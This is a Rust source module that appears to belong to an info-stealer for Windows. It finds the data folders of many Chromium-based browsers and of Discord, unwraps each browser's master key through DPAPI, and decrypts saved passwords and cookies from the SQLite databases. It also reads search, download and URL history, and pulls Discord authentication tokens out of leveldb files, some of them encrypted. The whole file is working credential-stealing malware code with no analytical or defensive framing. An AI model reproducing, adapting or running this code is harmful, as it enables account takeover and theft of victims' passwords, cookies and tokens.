use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit};
use base64::{engine::general_purpose, Engine as _};
use regex::Regex;
use serde_json::from_str;
use std::collections::HashMap;
use std::io::Read;
use std::{env, fs};
use tempdir::TempDir;

#[cfg(windows)]
use winapi::um::dpapi::CryptUnprotectData;
#[cfg(windows)]
use winapi::um::wincrypt::CRYPTOAPI_BLOB;

pub fn get_browsers() -> (HashMap<String, String>, HashMap<String, String>) {
    let local = env::var("localappdata").unwrap();
    let roaming = env::var("appdata").unwrap();

    let browsers: HashMap<String, String> = HashMap::from([
        (
            format!("{}\\Opera Software\\Opera Stable", roaming),
            "Opera".to_string(),
        ),
        (
            format!("{}\\Opera Software\\Opera GX Stable", roaming),
            "Opera GX".to_string(),
        ),
        (format!("{}\\Amigo\\User Data", local), "Amigo".to_string()),
        (format!("{}\\Torch\\User Data", local), "Torch".to_string()),
        (
            format!("{}\\Kometa\\User Data", local),
            "Kometa".to_string(),
        ),
        (
            format!("{}\\Orbitum\\User Data", local),
            "Orbitum".to_string(),
        ),
        (
            format!("{}\\CentBrowser\\User Data", local),
            "CentBrowser".to_string(),
        ),
        (
            format!("{}\\7Star\\7Star\\User Data", local),
            "7Star".to_string(),
        ),
        (
            format!("{}\\Sputnik\\Sputnik\\User Data", local),
            "Sputnik".to_string(),
        ),
        (
            format!("{}\\Google\\Chrome SxS\\User Data", local),
            "Chrome SxS".to_string(),
        ),
    ]);

    let browsers_with_profile: HashMap<String, String> = HashMap::from([
        (
            format!("{}\\Vivaldi\\User Data", local),
            "Vivaldi".to_string(),
        ),
        (
            format!("{}\\Microsoft\\Edge\\User Data", local),
            "Microsoft Edge".to_string(),
        ),
        (
            format!("{}\\Yandex\\YandexBrowser\\User Data", local),
            "Yandex".to_string(),
        ),
        (
            format!("{}\\Iridium\\User Data", local),
            "Iridium".to_string(),
        ),
        (
            format!("{}\\uCozMedia\\Uran\\User Data", local),
            "Uran".to_string(),
        ),
        (
            format!("{}\\BraveSoftware\\Brave-Browser\\User Data", local),
            "Brave".to_string(),
        ),
        (
            format!("{}\\Google\\Chrome\\User Data", local),
            "Chrome".to_string(),
        ),
    ]);

    return (browsers, browsers_with_profile);
}

pub fn get_discord_client() -> HashMap<String, String> {
    let roaming = env::var("appdata").unwrap();

    HashMap::from([
        (format!("{}\\discord", roaming), "Discord".to_string()),
        (
            format!("{}\\discordcanary", roaming),
            "Discord Canary".to_string(),
        ),
        (
            format!("{}\\discordptb", roaming),
            "Discord PTB".to_string(),
        ),
    ])
}

pub fn get_master_key(local_state_path: &std::path::PathBuf) -> Option<Vec<u8>> {
    let tmp_dir = TempDir::new("wintemp").unwrap();
    let tmp_local_state_path = tmp_dir.path().join("Local State");

    match std::fs::copy(local_state_path, &tmp_local_state_path) {
        Ok(_) => {}
        Err(_) => {
            return None;
        }
    };
    let content = std::fs::read_to_string(tmp_local_state_path).unwrap();
    tmp_dir.close().unwrap();

    let obj: serde_json::Value = match from_str(&content) {
        Ok(o) => o,
        Err(_) => {
            return None;
        }
    };

    let encrypted_key = match obj["os_crypt"]["encrypted_key"].as_str() {
        Some(key) => key,
        None => {
            return None;
        }
    };

    let encrypted_key = match general_purpose::STANDARD.decode(encrypted_key) {
        Ok(key) => key[5..].to_vec(),
        Err(_) => {
            return None;
        }
    };

    Some(win32_crypt_unprotect_data(encrypted_key))
}

pub fn get_passwords(
    login_data_path: &std::path::PathBuf,
    key: &[u8],
) -> Option<HashMap<String, (String, String)>> {
    let tmp_dir = TempDir::new("wintemp").unwrap();
    let tmp_login_data_path = tmp_dir.path().join("Login Data");

    if std::fs::copy(login_data_path, &tmp_login_data_path).is_err() {
        return None;
    }

    let conn = sqlite::Connection::open(tmp_login_data_path).unwrap();
    let mut statement = conn
        .prepare("SELECT origin_url, username_value, password_value FROM logins")
        .unwrap();

    let mut logins = HashMap::new();

    while let sqlite::State::Row = statement.next().unwrap() {
        let url = statement.read::<String>(0).unwrap();
        let username = statement.read::<String>(1).unwrap();
        let password = statement.read::<Vec<u8>>(2).unwrap();
        let password = match aes_decrypt(key, password) {
            Some(r) => r,
            None => continue,
        };

        let password = std::str::from_utf8(&password)
            .unwrap()
            .to_string();
        logins.insert(url, (username, password));
    }
    Some(logins)
}

pub fn get_history(
    history_data_path: &std::path::PathBuf,
) -> Option<(Vec<String>, Vec<(String, String)>, Vec<String>)> {
    let tmp_dir = TempDir::new("wintemp").unwrap();
    let tmp_login_data_path = tmp_dir.path().join("History");

    if std::fs::copy(history_data_path, &tmp_login_data_path).is_err() {
        return None;
    };

    let conn = sqlite::Connection::open(tmp_login_data_path).unwrap();
    let mut statement = conn
        .prepare("select term from keyword_search_terms")
        .unwrap();

    let mut terms = Vec::new();
    let mut downloads = Vec::new();
    let mut visited = Vec::new();

    while let sqlite::State::Row = statement.next().unwrap() {
        terms.push(statement.read::<String>(0).unwrap());
    }

    statement = conn
        .prepare("select current_path, tab_url from downloads")
        .unwrap();

    while let sqlite::State::Row = statement.next().unwrap() {
        downloads.push((
            statement.read::<String>(0).unwrap(),
            statement.read::<String>(1).unwrap(),
        ));
    }

    statement = conn
        .prepare("select url from downloads_url_chains")
        .unwrap();

    while let sqlite::State::Row = statement.next().unwrap() {
        visited.push(statement.read::<String>(0).unwrap())
    }

    Some((terms, downloads, visited))
}

pub fn get_cookies(
    cookies_data_path: &std::path::PathBuf,
    key: &[u8],
) -> Option<HashMap<String, (String, String, String)>> {
    let tmp_dir = TempDir::new("wintemp").unwrap();
    let tmp_login_data_path = tmp_dir.path().join("Cookies");

    if std::fs::copy(cookies_data_path, &tmp_login_data_path).is_err() {
        return None;
    };

    let mut cookies = HashMap::new();

    let conn = sqlite::Connection::open(tmp_login_data_path).unwrap();
    let mut statement = conn
        .prepare("select host_key, name, encrypted_value, path from cookies")
        .unwrap();
    while let sqlite::State::Row = statement.next().unwrap() {
        let host_key = statement.read::<String>(0).unwrap();
        let name = statement.read::<String>(1).unwrap();

        let value = match aes_decrypt(key, statement.read::<Vec<u8>>(2).unwrap()) {
            Some(r) => r,
            None => continue,
        };

        let value = std::str::from_utf8(&value)
            .unwrap()
            .to_string();
        let path = statement.read::<String>(3).unwrap();

        cookies.insert(host_key, (name, value, path));
    }

    Some(cookies)
}

pub fn token_extract(db_path: &std::path::PathBuf, key: &[u8], is_client: bool) -> Vec<String> {
    let regexp = Regex::new(r#"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"#).unwrap();
    let regexp_enc = Regex::new(r#"dQw4w9WgXcQ:[^\"]*"#).unwrap();

    let mut tokens: Vec<String> = Vec::new();

    if is_client {
        for file in fs::read_dir(db_path).unwrap() {
            let file_entry = file.unwrap().path();
            let file_name = file_entry.file_name().unwrap().to_str().unwrap();
            if file_name.ends_with("log") || file_name.ends_with("ldb") {
                let mut file_content = Vec::new();

                fs::File::open(file_entry)
                    .unwrap()
                    .read_to_end(&mut file_content)
                    .unwrap();

                let file_content = file_content
                    .iter()
                    .map(|x| String::from(*x as char))
                    .collect::<String>();

                for line in file_content.lines().filter(|x| !x.trim().is_empty()) {
                    for y in regexp_enc.find_iter(line) {
                        let decoded = general_purpose::STANDARD
                            .decode(y.as_str().split("dQw4w9WgXcQ:").nth(1).unwrap())
                            .unwrap();

                        let token = match aes_decrypt(key, decoded) {
                            Some(r) => r,
                            None => continue
                        };

                        tokens.push(String::from_utf8(token).unwrap());
                    }
                }
            }
        }

        return tokens;
    } else {
        for file in fs::read_dir(db_path).unwrap() {
            let file_entry = file.unwrap().path();
            let file_name = file_entry.file_name().unwrap().to_str().unwrap();

            if file_name.ends_with("log") || file_entry.ends_with("ldb") {
                let mut file_content = Vec::new();

                fs::File::open(file_entry)
                    .unwrap()
                    .read_to_end(&mut file_content)
                    .unwrap();

                let file_content = file_content
                    .iter()
                    .map(|x| String::from(*x as char))
                    .collect::<String>();

                for line in file_content.lines().filter(|x| !x.trim().is_empty()) {
                    for token in regexp.find_iter(line) {
                        tokens.push(token.as_str().to_string());
                    }
                }
            }
        }
        return tokens;
    }
}

#[cfg(target_os = "windows")]
pub fn win32_crypt_unprotect_data(mut encrypted_key: Vec<u8>) -> Vec<u8> {
    let mut in_data = CRYPTOAPI_BLOB {
        cbData: encrypted_key.len() as u32,
        pbData: encrypted_key.as_mut_ptr(),
    };
    let mut out_data = CRYPTOAPI_BLOB {
        cbData: 0,
        pbData: std::ptr::null_mut(),
    };

    unsafe {
        CryptUnprotectData(
            &mut in_data,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut out_data,
        );

        Vec::from_raw_parts(
            out_data.pbData,
            out_data.cbData as usize,
            out_data.cbData as usize,
        )
    }
}

// FIX:

pub fn aes_decrypt(key: &[u8], data: Vec<u8>) -> Option<Vec<u8>> {
    if data.is_empty() {
        return None;
    }

    let key = GenericArray::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = GenericArray::from_slice(&data[3..15]);

    match cipher.decrypt(nonce, data[15..].as_ref()) {
        Ok(data) => Some(data),
        Err(_) => Some(win32_crypt_unprotect_data(data)),
    }
}
